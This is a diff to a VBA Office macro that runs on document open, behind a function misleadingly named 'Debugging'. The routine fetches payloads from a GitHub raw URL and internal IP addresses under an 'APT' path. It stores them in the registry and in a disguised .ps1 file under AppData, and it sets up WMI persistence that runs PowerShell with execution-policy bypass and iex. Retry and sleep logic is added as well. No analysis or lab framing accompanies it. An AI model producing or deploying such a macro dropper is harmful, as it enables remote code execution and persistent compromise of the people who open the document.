@@ -1,5 +1,5 @@
 Public Runs As Boolean
-
+Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
 Sub Auto_Open()
     
     Call Debugging
@@ -70,11 +70,11 @@ Failed:
     RegPayload = False
     
 End Function
-Private Function FilePayload(ByVal FilePath As String, ByVal FileName As String, ByVal ADSName As String, ByVal Payload As String)
+Private Function FilePayload(ByVal FileFullPath As String, ByVal ADSName As String, ByVal Payload As String)
 
     Dim fileSysObj
     Set fileSysObj = CreateObject("Scripting.FileSystemObject")
-    Set fileObj = fileSysObj.CreateTextFile(FilePath & FileName & ":" & ADSName)
+    Set fileObj = fileSysObj.CreateTextFile(FileFullPath)
     fileObj.WriteLine Payload
     fileObj.Close
 
@@ -140,17 +140,24 @@ Private Function DeBase64(strData)
     Wend
     DeBase64 = StrConv(outArray, vbUnicode)
 End Function
-Private Function HTTPClient(ByVal xUrl As String) As String
-    
+Private Function HTTPClient(ByVal xUrl As String, ByVal xLoop As Integer) As String
+    Dim State As Integer
     Dim ie As Object
     Set ie = CreateObject("InternetExplorer.Application")
-    ie.Navigate xUrl
-    State = 0
-    Do Until State = 4
-    DoEvents: State = ie.readyState
+    Do Until xLoop = 1
+        If xLoop = 2 Then
+            Sleep 15000
+        Else
+            xLoop = 1
+        End If
+        ie.Navigate xUrl
+        State = 0
+        Do Until State = 4
+           DoEvents: State = ie.readyState
+        Loop
     Loop
     On Error GoTo Failed
-    HTTPClient = ie.Document.Body.getElementsByTagName("pre").Item(0).innerHTML
+    HTTPClient = ie.Document.Body.InnerText
     Exit Function
 Failed:
     HTTPClient = False
@@ -160,20 +167,22 @@ Private Function Debugging() As Boolean
     
     If Runs = True Then GoTo Failed
     
-    Dim Str, CurrentUserSid, PayloadConsumer, xrUrl, xfUrl, xRegKey, xFilePath, xFileName, xADSName As String
-    xrUrl = "http://10.0.0.155/APT/text.txt"
-    xfUrl = "http://10.0.0.155/APT/text.txt"
-    xFilePath = Environ("APPDATA") & "\Microsoft\Office\"
-    xFileName = "NormalDocument.dotm"
+    Dim Str, CurrentUserSid, PayloadConsumer, xrUrl, xfUrl, xRegKey, xFileFullPath, xFilePath, xFileName, xADSName, debugs As String
+    xrUrl = "https://raw.githubusercontent.com/xia33F/APT/master/payloads/master_page"
+    xfUrl = "https://raw.githubusercontent.com/xia33F/APT/master/payloads/wrapper_page"
+    xFilePath = Environ("APPDATA") & "\Microsoft\Office\Recent\"
+    xFileName = "tmpA7Z2.ps1"
+    xFileFullPath = xFilePath & xFileName
     xADSName = "secret.txt"
-    xRegKey = "HKLM\Software\Sysinternals\AutoRuns\EulaValue"
+    xRegKey = "HKEY_USERS\S-1-5-21-3921924719-2751751025-4067464375-1003\Software\RegisteredApplications\AppXs42fd12c3po92dynnq2r142fs12qhvsmyy"
     
-    PayloadConsumer = "powershell.exe -noP -ep bypass -C ""(gc '" & xFilePath & xFileName & ":" & xADSName _
-    & "')"" | powershell.exe -nop -"
+    PayloadConsumer = "powershell.exe -noP -ep bypass iex -c ""('" & xFileFullPath & "')"""
     
-    Call RegPayload(xRegKey, HTTPClient(xfUrl))
-    Call FilePayload(xFilePath, xFileName, xADSName, HTTPClient(xfUrl))
+    Call RegPayload(xRegKey, HTTPClient(xrUrl, 3))
+    Call FilePayload(xFileFullPath, xADSName, HTTPClient(xfUrl, 3))
     Call WMIPersistence(PayloadConsumer, "LogRotate")
+    
+    debugs = HTTPClient("http://10.0.0.14/APT/fff.txt", 2)
     
     On Error GoTo Failed
     Debugging = True
